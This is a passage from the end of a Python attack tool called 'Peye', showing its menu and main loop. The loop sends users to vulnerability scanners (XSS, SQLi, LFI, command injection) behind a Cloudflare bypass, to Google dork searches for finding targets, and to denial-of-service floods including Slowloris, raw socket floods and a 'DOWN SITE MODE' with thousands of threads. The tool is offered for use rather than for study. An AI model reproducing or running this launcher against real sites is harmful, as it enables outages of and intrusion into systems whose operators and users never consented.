║ {CYAN}[4] {WHITE}Technology Stack Detection                                       ║
║ {CYAN}[5] {WHITE}XSS Scanner                                                     ║
║ {CYAN}[6] {WHITE}SQLi Scanner                                                    ║
║ {CYAN}[7] {WHITE}LFI Scanner                                                     ║
║ {CYAN}[8] {WHITE}Command Injection Scanner                                       ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[🔍 DORK SEARCH]{RESET}{YELLOW}                                                    ║
║ {CYAN}[9] {WHITE}Search with Google Dork                                         ║
║ {CYAN}[10] {WHITE}Search from dork.txt File                                       ║
║ {CYAN}[11] {WHITE}Search by Technology                                            ║
║ {CYAN}[12] {WHITE}Show Popular Dorks                                              ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[💥 DoS ATTACK]{RESET}{YELLOW}                                                     ║
║ {CYAN}[13] {WHITE}HTTP Flood              [14] {WHITE}Raw Socket Flood                   ║
║ {CYAN}[15] {WHITE}Slowloris               [16] {WHITE}DNS Attack                        ║
║ {CYAN}[17] {WHITE}Mixed Methods Flood     [18] {WHITE}ALL ATTACKS                       ║
║ {CYAN}[19] {WHITE}DOWN SITE MODE                                                      ║
╠══════════════════════════════════════════════════════════════════╣
║ {CYAN}[P] {WHITE}Toggle Proxy (Current: {proxy_status})                                    ║
║ {CYAN}[0] {WHITE}Exit                                                           ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
""")
    
    def run(self):
        print_banner()
        
        while True:
            self.menu()
            choice = input(f"{GREEN}\n> {RESET}").upper()
            
            if choice == '0':
                sys.exit(0)
            
            if choice == 'P':
                self.use_proxy = not self.use_proxy
                print(f"{GREEN}[✓] Proxy: {'ON' if self.use_proxy else 'OFF'}{RESET}")
                time.sleep(1)
                os.system('clear')
                print_banner()
                continue
            
            # Scanner options
            if choice in ['1','2','3','4','5','6','7','8']:
                target = input(f"{GREEN}Target URL: {RESET}").strip()
                if not target.startswith(('http://','https://')):
                    target = 'http://' + target
                
                print(f"{YELLOW}[*] Connecting to {target}...{RESET}")
                session = CFBypass(target).bypass()
                scanner = AdvancedScanner(target, session)
                
                connected, status = scanner.check_connection(target)
                if not connected:
                    if status == 403:
                        print(f"{RED}[✗] Access Denied (403) - Target blocking{RESET}")
                    else:
                        print(f"{RED}[✗] Cannot reach target{RESET}")
                    input(f"\n{YELLOW}Enter to continue{RESET}")
                    os.system('clear')
                    print_banner()
                    continue
                
                print(f"{GREEN}[✓] Connection OK (Status: {status}){RESET}")
                
                if choice == '1':
                    scanner.full_scan()
                elif choice == '2':
                    scanner.dir_scan()
                elif choice == '3':
                    domain = urlparse(target).netloc
                    scanner.subdomain_scan(domain)
                elif choice == '4':
                    detector = TechnologyDetector(target, session)
                    if detector.detect():
                        detector.display()
                elif choice == '5':
                    scanner.vuln_scan('XSS', scanner.wordlists.get('xss'), 'q', '<script>')
                    scanner.report.display()
                elif choice == '6':
                    scanner.vuln_scan('SQLi', scanner.wordlists.get('sqli'), 'id', 'mysql|syntax')
                    scanner.report.display()
                elif choice == '7':
                    scanner.vuln_scan('LFI', scanner.wordlists.get('lfi'), 'file', 'root:')
                    scanner.report.display()
                elif choice == '8':
                    scanner.vuln_scan('CMD', scanner.wordlists.get('cmd'), 'cmd', 'uid=')
                    scanner.report.display()
            
            # Dork search options
            elif choice == '9':
                dork = input(f"{GREEN}Enter Google Dork: {RESET}")
                self.dork.search_google(dork)
                print(f"\n{GREEN}[✓] Found {len(self.dork.results)} results{RESET}")
            
            elif choice == '10':
                self.dork.search_from_file()
                print(f"\n{GREEN}[✓] Found {len(self.dork.results)} results from dork.txt{RESET}")
            
            elif choice == '11':
                tech = input(f"{GREEN}Enter technology (wordpress/laravel/php/jquery/nginx/apache/admin/indonesia/com/org/net): {RESET}")
                self.dork.tech_search(tech)
                print(f"\n{GREEN}[✓] Found {len(self.dork.results)} results{RESET}")
            
            elif choice == '12':
                self.dork.popular_dorks()
            
            # DoS Attack options
            elif choice in ['13','14','15','16','17','18','19']:
                target = input(f"{GREEN}Target URL: {RESET}").strip()
                if not target.startswith(('http://','https://')):
                    target = 'http://' + target
                
                dur = int(input(f"{YELLOW}Duration (s): {RESET}"))
                thr = int(input(f"{YELLOW}Threads (100-5000): {RESET}"))
                dos = DoSAttack(target, self.use_proxy)
                
                attack_map = {
                    '13': dos.http_flood, '14': dos.raw_flood, '15': dos.slowloris,
                    '16': dos.dns_attack, '17': dos.mixed_flood, '18': dos.all_attacks,
                    '19': dos.down_site
                }
                if choice in attack_map:
                    attack_map[choice](dur, min(thr, 5000))
            
            input(f"\n{YELLOW}Enter{RESET}")
            os.system('clear')
            print_banner()

if __name__ == "__main__":
    try:
        import cloudscraper
    except:
        os.system('pip install cloudscraper')
    peye = Peye()
    peye.run()
